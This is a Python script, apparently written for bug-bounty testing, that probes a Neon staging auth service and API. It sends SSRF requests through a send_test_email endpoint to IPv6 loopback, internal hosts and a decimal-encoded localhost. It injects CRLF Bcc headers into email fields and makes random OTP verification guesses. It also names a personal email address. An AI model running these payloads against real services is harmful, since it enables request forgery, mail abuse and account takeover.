# -*- coding: utf-8 -*-
"""V4+V5: email-flow attacks.
V4: send_test_email variants (ipv6 host, internal host probe, CRLF injection echo).
V5: signup emailVerified semantics + change-email + verification OTP attempt limiting.
All recipients/emails are attacker-owned aliases."""
import json, ssl, time, http.client, random, string

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
ME = "libobo1229@gmail.com"
TAG = "v5" + "".join(random.choices(string.ascii_lowercase + string.digits, k=4))


def api(method, path, body=None, timeout=40):
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    hdr = {"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY}
    if body is not None:
        hdr["Content-Type"] = "application/json"
        body = json.dumps(body)
    t0 = time.time()
    conn.request(method, API_BASE + path, body=body, headers=hdr)
    r = conn.getresponse()
    data = r.read().decode("utf-8", "replace")
    conn.close()
    return r.status, data, time.time() - t0


def na(method, path, body=None, cookie=None, timeout=30):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
            "User-Agent": "Mozilla/5.0", "Accept": "application/json",
            "X-Bug-Bounty": "xxbo"}
    if cookie:
        hdrs["Cookie"] = cookie
    t0 = time.time()
    conn.request(method, path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    dt = time.time() - t0
    conn.close()
    time.sleep(0.6)
    return resp.status, data, ck, dt


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def main():
    out("== V4/V5 email flows ==")
    # ---------- V4: send_test_email variants ----------
    base = "/projects/%s/branches/%s/auth" % (PA, PAMAIN)
    # V4a ipv6 loopback + internal-style hosts on allowed ports
    for tag, host in [("ipv6 loopback", "::1"), ("ipv6 meta", "fe80::1"),
                      ("internal dns", "api.internal"), ("neon internal", "otel.internal"),
                      ("decimal ip 127.0.0.1", "2130706433")]:
        st, d, dt = api("POST", base + "/send_test_email",
                        {"host": host, "port": 587, "username": "a", "password": "b",
                         "sender_email": ME, "sender_name": "t", "recipient_email": ME})
        out("V4a %-18s -> %d %.1fs %s" % (tag, st, dt, d[:200].replace("\n", " ")))
        time.sleep(0.8)
    # V4b CRLF injection in sender_name / sender_email
    for tag, field, val in [("sender_name crlf", "sender_name", "x\r\nBcc: victim@example.com"),
                            ("sender_email crlf", "sender_email", "a@b.com\r\nBcc: v@e.com"),
                            ("recipient crlf", "recipient_email", ME + "\r\nBcc: v@e.com")]:
        body = {"host": "127.0.0.1", "port": 465, "username": "a", "password": "b",
                "sender_email": ME, "sender_name": "t", "recipient_email": ME}
        body[field] = val
        st, d, dt = api("POST", base + "/send_test_email", body)
        out("V4b %-18s -> %d %s" % (tag, st, d[:200].replace("\n", " ")))
        time.sleep(0.8)

    # ---------- V5: signup/verify semantics ----------
    em = "libobo1229+%s@gmail.com" % TAG
    st, d, ck, dt = na("POST", "/neondb/auth/sign-up/email",
                       {"email": em, "password": "SecTest!2026pass", "name": TAG})
    out("V5 signup %s -> %d %.1fs %s" % (em, st, dt, d[:250]))
    cookie = ck.split(";")[0] if ck else ""
    # who am i (emailVerified?)
    st, d, ck2, dt = na("GET", "/neondb/auth/get-session", cookie=cookie or None)
    out("V5 get-session -> %d %s" % (st, d[:300]))

    # verification endpoint discovery
    for ep in ["/neondb/auth/send-verification-email", "/neondb/auth/verify-email"]:
        st, d, ck3, dt = na("POST", ep, {"email": em} if "send" in ep else
                            {"email": em, "code": "000000"}, cookie or None)
        out("V5 %s -> %d %.1fs %s" % (ep, st, dt, d[:200]))
    # change-email endpoint?
    for ep in ["/neondb/auth/change-email", "/neondb/auth/change-password"]:
        st, d, ck4, dt = na("POST", ep, {"newEmail": ME} if "change-email" in ep else
                            {"newPassword": "SecTest!2026pass2", "oldPassword": "SecTest!2026pass"},
                            cookie or None)
        out("V5 %s -> %d %.1fs %s" % (ep, st, dt, d[:200]))
    # OTP brute attempt limiting: request verify code then try wrong codes
    st, d, ck5, dt = na("POST", "/neondb/auth/request-email-verification" if False else
                        "/neondb/auth/send-verification-email", {"email": em}, cookie or None)
    out("V5 resend verify -> %d %s" % (st, d[:200]))
    for i in range(4):
        code = "".join(random.choices(string.digits, k=6))
        st, d, ck6, dt = na("POST", "/neondb/auth/verify-email",
                            {"email": em, "code": code}, cookie or None)
        out("V5 verify attempt %d (%s) -> %d %.1fs %s" % (i + 1, code, st, dt, d[:160]))
        if st == 429:
            out("!! rate limited after %d attempts" % (i + 1))
            break


if __name__ == "__main__":
    main()
